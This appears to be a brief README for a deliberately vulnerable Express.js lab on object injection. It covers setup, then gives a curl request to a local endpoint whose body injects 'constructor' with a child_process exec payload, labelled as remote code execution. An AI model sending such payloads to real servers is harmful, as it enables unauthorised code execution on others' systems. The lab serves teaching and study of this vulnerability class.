# Express-object-injection

## Step 0

* Install nodejs

* Install express

```console
$ npm install
```
* Start application

```console
$ node index.js
```

## Step 1

Make malicious request to perform Remote Code Execution

```console
$ curl --request POST http://localhost:3000/api/user --data "['constructor', 'require("child_process").exec(arguments[0],console.log)']"
$ curl --request POST http://localhost:3000/api/user --data "['anyVal', 'date']"
```
